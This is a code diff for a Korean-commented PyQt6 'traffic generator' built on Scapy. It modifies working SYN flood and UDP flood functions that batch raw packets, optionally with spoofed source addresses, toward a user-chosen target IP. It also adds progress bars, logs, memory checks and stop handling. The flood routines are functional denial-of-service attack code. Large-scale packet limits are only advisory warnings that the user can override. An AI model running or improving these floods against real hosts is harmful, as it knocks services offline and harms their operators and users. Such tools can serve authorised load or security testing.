@@ -1,5 +1,5 @@
 # 필요한 모듈을 임포트.
-from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox
+from PyQt6.QtWidgets import QWidget, QVBoxLayout, QLabel, QPushButton, QLineEdit, QHBoxLayout, QCheckBox, QMessageBox, QComboBox, QProgressBar, QTextEdit
 from PyQt6.QtGui import QIcon
 from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
 from scapy.all import IP, TCP, UDP, send, sr1, ICMP, Ether, ARP, conf, Raw
@@ -24,11 +24,12 @@ sys.path.append(parent_dir)
 # Scapy 설정 (Wireshark에서 캡처가 잘 되도록)
 conf.verb = 0  # 상세 출력 비활성화
 
-# 최대 패킷 캐시 크기 제한 (메모리 최적화)
-MAX_PACKET_CACHE_SIZE = 1000
+# 최대 패킷 캐시 크기 제한 (메모리 최적화) - 크기를 더 줄임
+MAX_PACKET_CACHE_SIZE = 200  # 1000에서 200으로 감소
+PACKET_BATCH_SIZE = 50       # 배치 크기를 더 작게
 
 # SYN 플러드 공격을 수행하는 함수.
-def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
     # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
     iface, src_ip = get_default_iface_and_ip()
     if not iface:
@@ -58,18 +59,32 @@ def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
         packet = IP(src=src_ip, dst=target_ip)/TCP(sport=sport, dport=dport, flags='S')/Raw(load='X'*payload_size)
         packets.append(packet)
         
-        # 일정 개수마다 전송 (메모리 부담 감소)
-        if len(packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
+        # 배치 크기마다 전송 (메모리 부담 감소)
+        if len(packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
             try:
                 send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                 sent_count += len(packets)
-                # 로그 출력 빈도 감소 (매 1000개마다)
-                if sent_count % 1000 == 0 or i == packet_count-1:
+                
+                # 진행률 콜백 호출
+                if progress_callback:
+                    progress = int((i + 1) / packet_count * 100)
+                    progress_callback.emit(f"SYN 플러드 진행률: {progress}% ({sent_count}/{packet_count})")
+                
+                # 로그 출력 빈도 감소 (매 500개마다)
+                if sent_count % 500 == 0 or i == packet_count-1:
                     print(f'{sent_count}개 SYN 패킷 전송 완료 ({i+1}/{packet_count})')
+                
                 packets.clear()  # packets = [] 대신 clear() 사용하여 메모리 재사용
+                
+                # 중간에 잠시 대기하여 시스템 부하 감소
+                if i < packet_count - 1:
+                    time.sleep(0.001)  # 1ms 대기
+                    
             except Exception as e:
                 print(f'패킷 전송 중 오류: {str(e)}')
                 packets.clear()  # 오류 발생해도 메모리 정리
+                # 오류 발생 시 잠시 대기
+                time.sleep(0.01)
     
     # 메모리 정리
     del packets
@@ -77,7 +92,7 @@ def syn_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
     print(f"SYN 플러드 완료 - 총 {sent_count}개 패킷 전송")
 
 # UDP 플러드 공격을 수행하는 함수.
-def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
+def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None, progress_callback=None):
     # 현재 시스템의 기본 네트워크 인터페이스와 IP 주소 가져오기
     iface, src_ip = get_default_iface_and_ip()
     if not iface:
@@ -107,18 +122,32 @@ def udp_flood(target_ip, packet_count, packet_size, stop_flag, spoof_ip=None):
         packet = IP(src=src_ip, dst=target_ip)/UDP(sport=sport, dport=dport)/Raw(load='X'*payload_size)
         packets.append(packet)
         
-        # 일정 개수마다 전송 (메모리 부담 감소)
-        if len(packets) >= min(MAX_PACKET_CACHE_SIZE, 500) or i == packet_count-1:
+        # 배치 크기마다 전송 (메모리 부담 감소)
+        if len(packets) >= PACKET_BATCH_SIZE or i == packet_count-1:
             try:
                 send(packets, iface=iface, verbose=0, inter=0, realtime=False)
                 sent_count += len(packets)
-                # 로그 출력 빈도 감소 (매 1000개마다)
-                if sent_count % 1000 == 0 or i == packet_count-1:
+                
+                # 진행률 콜백 호출
+                if progress_callback:
+                    progress = int((i + 1) / packet_count * 100)
+                    progress_callback.emit(f"UDP 플러드 진행률: {progress}% ({sent_count}/{packet_count})")
+                
+                # 로그 출력 빈도 감소 (매 500개마다)
+                if sent_count % 500 == 0 or i == packet_count-1:
                     print(f'{sent_count}개 UDP 패킷 전송 완료 ({i+1}/{packet_count})')
+                
                 packets.clear()  # 메모리 재사용
+                
+                # 중간에 잠시 대기하여 시스템 부하 감소
+                if i < packet_count - 1:
+                    time.sleep(0.001)  # 1ms 대기
+                    
             except Exception as e:
                 print(f'패킷 전송 중 오류: {str(e)}')
                 packets.clear()  # 오류 발생해도 메모리 정리
+                # 오류 발생 시 잠시 대기
+                time.sleep(0.01)
     
     # 메모리 정리
     del packets
@@ -471,11 +500,13 @@ class TrafficGeneratorThread(QThread):
     finished = pyqtSignal(str)  # 완료 시그널
     error = pyqtSignal(str)     # 오류 시그널
     
-    def __init__(self, attack_func, args):
+    def __init__(self, attack_func, args, attack_name="Unknown"):
         super().__init__()
         self.attack_func = attack_func
         self.args = args
+        self.attack_name = attack_name
         self.stop_flag = threading.Event()
+        self.is_stopped = False
         
     def run(self):
         """스레드 실행"""
@@ -483,34 +514,51 @@ class TrafficGeneratorThread(QThread):
             # stop_flag를 args에 추가 (None을 찾아서 대체)
             args_with_flag = list(self.args)
             
-            # None을 stop_flag로 대체
+            # None을 stop_flag로 대체하고 progress_callback 추가
             for i in range(len(args_with_flag)):
                 if args_with_flag[i] is None:
                     args_with_flag[i] = self.stop_flag
                     break
             
-            self.progress.emit(f"트래픽 생성 시작...")
+            # progress_callback 추가 (함수가 지원하는 경우)
+            if self.attack_name in ["SYN 플러드", "UDP 플러드"]:
+                args_with_flag.append(self.progress)
+            
+            self.progress.emit(f"{self.attack_name} 시작...")
             self.attack_func(*args_with_flag)
-            self.finished.emit("트래픽 생성 완료")
+            
+            if not self.is_stopped:
+                self.finished.emit(f"{self.attack_name} 완료")
         except Exception as e:
-            self.error.emit(f"트래픽 생성 중 오류: {str(e)}")
+            if not self.is_stopped:
+                self.error.emit(f"{self.attack_name} 오류: {str(e)}")
             print(f"트래픽 생성 오류 상세: {e}")
             import traceback
             traceback.print_exc()
     
     def stop(self):
         """스레드 중지"""
+        self.is_stopped = True
         self.stop_flag.set()
-        self.wait(3000)  # 3초 대기
-        if self.isRunning():
+        
+        # 스레드가 종료될 때까지 최대 5초 대기
+        if not self.wait(5000):  # 3초에서 5초로 증가
+            print(f"Warning: {self.attack_name} 스레드가 정상 종료되지 않아 강제 종료합니다.")
             self.terminate()
+            self.wait(1000)  # 강제 종료 후 1초 대기
 
 # 트래픽 생성기 애플리케이션 클래스.
 class TrafficGeneratorApp(QWidget):
     def __init__(self, main_app, parent=None):
         super().__init__(parent)
         self.main_app = main_app  # MainApp 인스턴스를 저장
-        self.setWindowTitle("트래픽 생성기")
+        
+        # 관리자 권한 상태 확인
+        admin_status = ""
+        if hasattr(self.main_app, 'is_admin_mode') and self.main_app.is_admin_mode:
+            admin_status = " [관리자]"
+        
+        self.setWindowTitle("트래픽 생성기" + admin_status)
         layout = QVBoxLayout()
 
         # 상단 레이아웃 설정
@@ -648,9 +696,25 @@ class TrafficGeneratorApp(QWidget):
         packet_count_layout = QHBoxLayout()
         packet_count_label = QLabel("패킷 수:")
         self.packet_count_input = QLineEdit("10")
+        
+        # 안전성을 위한 경고 라벨 추가
+        warning_label = QLabel("⚠️ 권장: 1000개 이하 (메모리 부족 방지)")
+        warning_label.setStyleSheet("color: orange; font-size: 10px;")
+        
         packet_count_layout.addWidget(packet_count_label)
         packet_count_layout.addWidget(self.packet_count_input)
+        packet_count_layout.addWidget(warning_label)
         layout.addLayout(packet_count_layout)
+
+        # 진행률 표시 추가
+        self.progress_bar = QProgressBar()
+        self.progress_bar.setVisible(False)  # 초기에는 숨김
+        layout.addWidget(self.progress_bar)
+        
+        # 상태 표시 라벨 추가
+        self.status_label = QLabel("대기 중...")
+        self.status_label.setStyleSheet("color: blue; font-weight: bold;")
+        layout.addWidget(self.status_label)
 
         # 패킷 생성 버튼을 설정.
         self.generate_button = QPushButton("패킷 생성 및 전송")
@@ -662,6 +726,15 @@ class TrafficGeneratorApp(QWidget):
         self.stop_button.clicked.connect(self.stop_transmission)
         self.stop_button.setEnabled(False)  # 초기에는 비활성화
         layout.addWidget(self.stop_button)
+        
+        # 로그 출력 창 추가
+        log_label = QLabel("실행 로그:")
+        layout.addWidget(log_label)
+        
+        self.log_output = QTextEdit()
+        self.log_output.setMaximumHeight(100)  # 높이 제한
+        self.log_output.setReadOnly(True)
+        layout.addWidget(self.log_output)
 
         self.setLayout(layout)
 
@@ -672,6 +745,13 @@ class TrafficGeneratorApp(QWidget):
         self.gc_timer = QTimer(self)
         self.gc_timer.timeout.connect(self.clean_memory)
         self.gc_timer.start(300000)  # 1분에서 5분으로 변경하여 부하 감소
+        
+        # 초기 상태 메시지 출력
+        if hasattr(self.main_app, 'is_admin_mode'):
+            if self.main_app.is_admin_mode:
+                self.add_log("✅ 관리자 권한으로 실행 중입니다.")
+            else:
+                self.add_log("⚠️ 제한된 권한으로 실행 중입니다. 일부 기능이 제한될 수 있습니다.")
 
     # 메인 화면으로 돌아가는 메서드.
     def go_back(self):
@@ -681,19 +761,12 @@ class TrafficGeneratorApp(QWidget):
     # 트래픽을 생성하고 전송하는 메서드.
     def generate_traffic(self):
         """사용자 입력을 받아 트래픽을 생성합니다."""
-        # 관리자 권한 확인
-        if os.name == 'nt' and not self.is_admin():
-            reply = QMessageBox.question(
-                self, '관리자 권한 필요',
-                '이 기능은 관리자 권한이 필요합니다. 관리자 권한으로 실행하시겠습니까?',
-                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
-                QMessageBox.StandardButton.Yes
-            )
-            if reply == QMessageBox.StandardButton.Yes:
-                self.request_admin_privileges()
-                return
-            else:
-                QMessageBox.warning(self, '권한 부족', '관리자 권한 없이는 일부 기능이 제한될 수 있습니다.')
+        # 관리자 권한 확인 - 부모 애플리케이션에서 이미 처리됨
+        # 부모 애플리케이션이 관리자 권한 상태를 가지고 있는지 확인
+        if hasattr(self.main_app, 'is_admin_mode'):
+            if not self.main_app.is_admin_mode and os.name == 'nt':
+                self.add_log("⚠️ 경고: 관리자 권한이 없어 일부 기능이 제한될 수 있습니다.")
+                # 권한이 없어도 계속 진행 (일부 기능만 제한)
         
         # 유효성 검사
         target_ip = self.ip_input.text().strip()
@@ -704,10 +777,40 @@ class TrafficGeneratorApp(QWidget):
         try:
             packet_count = int(self.packet_count_input.text().strip())
             if packet_count <= 0:
-                raise ValueError()
-        except ValueError:
-            QMessageBox.warning(self, '입력 오류', '유효한 패킷 수를 입력하세요.')
+                raise ValueError("패킷 수는 0보다 커야 합니다.")
+            
+            # 안전성을 위한 패킷 수 제한
+            if packet_count > 10000:
+                reply = QMessageBox.question(
+                    self, '대량 패킷 경고',
+                    f'패킷 {packet_count}개는 시스템에 부하를 줄 수 있습니다.\n'
+                    f'계속 진행하시겠습니까? (권장: 1000개 이하)',
+                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
+                    QMessageBox.StandardButton.No
+                )
+                if reply == QMessageBox.StandardButton.No:
+                    return
+                    
+        except ValueError as e:
+            QMessageBox.warning(self, '입력 오류', f'유효한 패킷 수를 입력하세요: {str(e)}')
             return
+        
+        # 메모리 사용량 체크
+        try:
+            import psutil
+            memory_percent = psutil.virtual_memory().percent
+            if memory_percent > 80:
+                reply = QMessageBox.question(
+                    self, '메모리 부족 경고',
+                    f'현재 메모리 사용률이 {memory_percent:.1f}%입니다.\n'
+                    f'트래픽 생성을 계속하시겠습니까?',
+                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
+                    QMessageBox.StandardButton.No
+                )
+                if reply == QMessageBox.StandardButton.No:
+                    return
+        except ImportError:
+            self.add_log("경고: psutil이 없어 메모리 확인을 건너뜁니다.")
         
         # 패킷 크기 설정
         packet_size = self.get_packet_size()
@@ -763,67 +866,115 @@ class TrafficGeneratorApp(QWidget):
         # 기존 스레드 종료 및 리소스 정리
         self.stop_transmission()
         
-        # 버튼 상태 업데이트
+        # UI 상태 업데이트
         self.generate_button.setEnabled(False)
         self.stop_button.setEnabled(True)
+        self.progress_bar.setVisible(True)
+        self.progress_bar.setValue(0)
+        self.status_label.setText("트래픽 생성 중...")
+        self.status_label.setStyleSheet("color: green; font-weight: bold;")
+        self.log_output.clear()
         
         # 선택된 공격들을 실행
         attack_names = []
         for attack_name, attack_func, attack_args in selected_attacks:
             # TrafficGeneratorThread가 내부적으로 stop_flag를 관리
-            thread = TrafficGeneratorThread(attack_func, attack_args)
-            thread.finished.connect(lambda msg, name=attack_name: self.on_attack_finished(name))
-            thread.error.connect(lambda msg, name=attack_name: self.on_attack_error(name))
+            thread = TrafficGeneratorThread(attack_func, attack_args, attack_name)
+            thread.progress.connect(self.update_progress)
+            thread.finished.connect(lambda msg, name=attack_name: self.on_attack_finished(name, msg))
+            thread.error.connect(lambda msg, name=attack_name: self.on_attack_error(name, msg))
             thread.start()
             
             # 스레드 저장
             self.attack_threads.append(thread)
             attack_names.append(attack_name)
         
-        # 상태 표시만 하고 메시지박스는 제거 (GUI 블로킹 방지)
-        print(f'다음 공격들이 시작되었습니다: {", ".join(attack_names)}')
+        # 로그 출력
+        self.add_log(f'시작된 공격: {", ".join(attack_names)}')
+        self.add_log(f'대상 IP: {target_ip}, 패킷 수: {packet_count}')
 
     def stop_transmission(self):
         """모든 트래픽 전송을 중지합니다."""
         # 실행 중인 스레드가 없으면 조용히 종료
         if not self.attack_threads:
-            # 버튼 상태만 업데이트
-            if hasattr(self, 'generate_button'):
-                self.generate_button.setEnabled(True)
-            if hasattr(self, 'stop_button'):
-                self.stop_button.setEnabled(False)
+            # UI 상태만 업데이트
+            self.reset_ui_state()
             return
+        
+        self.add_log("트래픽 전송 중지 요청...")
+        self.status_label.setText("중지 중...")
+        self.status_label.setStyleSheet("color: orange; font-weight: bold;")
         
         # 스레드 종료
         for thread in self.attack_threads:
             thread.stop()
         
+        # 모든 스레드가 종료될 때까지 잠시 대기
+        QTimer.singleShot(1000, self.finalize_stop)
+        
+    def finalize_stop(self):
+        """스레드 종료 후 정리 작업"""
         # 리소스 정리
         self.attack_threads.clear()
         
         # 명시적 가비지 컬렉션
         gc.collect()
         
-        # 버튼 상태 업데이트
+        # UI 상태 업데이트
+        self.reset_ui_state()
+        
+        # 로그 출력
+        self.add_log('모든 트래픽 전송이 중지되었습니다.')
+        
+    def reset_ui_state(self):
+        """UI 상태를 초기 상태로 리셋"""
         if hasattr(self, 'generate_button'):
             self.generate_button.setEnabled(True)
         if hasattr(self, 'stop_button'):
             self.stop_button.setEnabled(False)
+        if hasattr(self, 'progress_bar'):
+            self.progress_bar.setVisible(False)
+        if hasattr(self, 'status_label'):
+            self.status_label.setText("대기 중...")
+            self.status_label.setStyleSheet("color: blue; font-weight: bold;")
+    
+    def update_progress(self, message):
+        """진행률 업데이트"""
+        self.add_log(message)
+        # 간단한 진행률 파싱 (예: "SYN 플러드 진행률: 50%")
+        if "진행률:" in message and "%" in message:
+            try:
+                percent_str = message.split("진행률:")[1].split("%")[0].strip()
+                percent = int(percent_str)
+                self.progress_bar.setValue(percent)
+            except (ValueError, IndexError):
+                pass
+    
+    def add_log(self, message):
+        """로그 메시지 추가"""
+        if hasattr(self, 'log_output'):
+            timestamp = time.strftime("[%H:%M:%S]")
+            self.log_output.append(f"{timestamp} {message}")
+            # 자동으로 맨 아래로 스크롤
+            cursor = self.log_output.textCursor()
+            cursor.movePosition(cursor.MoveOperation.End)
+            self.log_output.setTextCursor(cursor)
+
+    def on_attack_finished(self, attack_name, message=""):
+        """공격 완료 시 호출"""
+        self.add_log(f'{attack_name} 완료: {message}')
         
-        # 상태 출력
-        print('모든 트래픽 전송이 중지되었습니다.')
+        # 모든 스레드가 완료되었는지 확인
+        all_finished = all(not thread.isRunning() for thread in self.attack_threads)
+        if all_finished:
+            self.reset_ui_state()
+            self.add_log('모든 트래픽 생성 작업이 완료되었습니다.')
 
-    def is_admin(self):
-        try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
-        except:
-            return False
-
-    def request_admin_privileges(self):
-        try:
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-        except Exception as e:
-            QMessageBox.critical(self, "권한 오류", f"관리자 권한 요청에 실패했습니다: {e}")
+    def on_attack_error(self, attack_name, message=""):
+        """공격 오류 시 호출"""
+        error_msg = f'{attack_name} 오류: {message}'
+        self.add_log(error_msg)
+        QMessageBox.critical(self, '공격 오류', error_msg)
 
     def apply_preset(self):
         preset_name = self.preset_dropdown.currentText()
@@ -863,22 +1014,30 @@ class TrafficGeneratorApp(QWidget):
 
     def test_packet_transmission(self):
         """패킷 전송 테스트"""
-        target_ip = self.ip_input.text()
+        target_ip = self.ip_input.text().strip()
         
         if not self.is_valid_ip(target_ip):
             QMessageBox.warning(self, "오류", "유효한 IP 주소를 입력하세요.")
             return
-            
+        
+        self.add_log(f"패킷 전송 테스트 시작 - 대상: {target_ip}")
+        
         # 소켓 테스트
+        self.add_log("소켓 방식 테스트 중...")
         if test_packet_send(target_ip, "socket"):
+            self.add_log("✅ 소켓 패킷 전송 테스트 성공!")
             QMessageBox.information(self, "테스트 성공", "소켓 패킷 전송 테스트 성공!")
         else:
+            self.add_log("❌ 소켓 패킷 전송 테스트 실패")
             QMessageBox.warning(self, "테스트 실패", "소켓 패킷 전송 테스트 실패")
         
         # Scapy 테스트
+        self.add_log("Scapy 방식 테스트 중...")
         if test_packet_send(target_ip, "scapy"):
+            self.add_log("✅ Scapy 패킷 전송 테스트 성공!")
             QMessageBox.information(self, "테스트 성공", "Scapy 패킷 전송 테스트 성공!")
         else:
+            self.add_log("❌ Scapy 패킷 전송 테스트 실패")
             QMessageBox.warning(self, "테스트 실패", "Scapy 패킷 전송 테스트 실패")
 
     def clean_memory(self):
@@ -888,51 +1047,59 @@ class TrafficGeneratorApp(QWidget):
             gc.collect()
 
             # 스레드별 메모리 사용량 확인 (디버깅용)
-            import psutil
-            process = psutil.Process()
-            memory_info = process.memory_info()
-            print(f"메모리 사용량: {memory_info.rss / 1024 / 1024:.2f} MB")
+            try:
+                import psutil
+                process = psutil.Process()
+                memory_info = process.memory_info()
+                memory_mb = memory_info.rss / 1024 / 1024
+                
+                # 메모리 사용량이 높은 경우 로그 출력
+                if memory_mb > 500:  # 500MB 이상
+                    self.add_log(f"메모리 정리 완료 - 현재 사용량: {memory_mb:.2f} MB")
+                    
+                # 메모리 사용량이 매우 높은 경우 경고
+                if memory_mb > 1000:  # 1GB 이상
+                    self.add_log("⚠️ 메모리 사용량이 높습니다. 브라우저나 다른 프로그램을 종료하는 것을 권장합니다.")
+                    
+            except ImportError:
+                # psutil이 없는 경우 조용히 넘어감
+                pass
+                
         except Exception as e:
-            print(f"메모리 정리 중 오류: {e}")
+            # 메모리 정리 중 오류가 발생해도 로그만 남기고 계속 진행
+            if hasattr(self, 'add_log'):
+                self.add_log(f"메모리 정리 중 오류: {e}")
+            else:
+                print(f"메모리 정리 중 오류: {e}")
+
+    def closeEvent(self, event):
+        """창 닫기 이벤트 - 안전한 종료"""
+        if self.attack_threads:
+            reply = QMessageBox.question(
+                self, '종료 확인',
+                '트래픽 생성이 진행 중입니다. 종료하시겠습니까?',
+                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
+                QMessageBox.StandardButton.No
+            )
+            if reply == QMessageBox.StandardButton.No:
+                event.ignore()
+                return
+            
+            # 모든 스레드 강제 종료
+            self.stop_transmission()
+            
+            # 종료될 때까지 잠시 대기
+            for thread in self.attack_threads:
+                thread.wait(2000)  # 2초 대기
+                if thread.isRunning():
+                    thread.terminate()
+        
+        # 타이머 정리
+        if hasattr(self, 'gc_timer'):
+            self.gc_timer.stop()
+        
+        event.accept()
 
     def is_valid_ip(self, ip):
         """IP 주소 유효성 검사"""
-        return is_valid_ip(ip)
-
-    def on_attack_finished(self, attack_name):
-        print(f'{attack_name} 공격이 완료되었습니다.')
-        # 모든 스레드가 완료되었는지 확인
-        all_finished = all(not thread.isRunning() for thread in self.attack_threads)
-        if all_finished:
-            self.generate_button.setEnabled(True)
-            self.stop_button.setEnabled(False)
-
-    def on_attack_error(self, attack_name):
-        print(f'{attack_name} 공격 중 오류가 발생했습니다.')
-        QMessageBox.critical(self, '공격 오류', f'{attack_name} 공격 중 오류가 발생했습니다.')
-
-def test_packet_send(target_ip="127.0.0.1", method="scapy"):
-    """패킷 전송 테스트 함수"""
-    print(f"패킷 전송 테스트 시작 ({method} 사용)")
-    
-    try:
-        if method == "socket":
-            # 일반 소켓 사용
-            import socket
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(b"TEST", (target_ip, 12345))
-            s.close()
-            print("소켓 테스트 완료")
-            return True
-            
-        elif method == "scapy":
-            # Scapy 사용
-            iface = conf.iface  # Scapy 기본 인터페이스 사용
-            print(f"Scapy 사용 인터페이스: {iface}")
-            packet = IP(dst=target_ip)/UDP(dport=12345)/b"TEST"
-            send(packet, iface=iface, verbose=1)  # verbose=1로 설정하여 전송 정보 표시
-            print("Scapy 테스트 완료")
-            return True
-    except Exception as e:
-        print(f"패킷 전송 테스트 오류: {str(e)}")
-        return False 
+        return is_valid_ip(ip) 
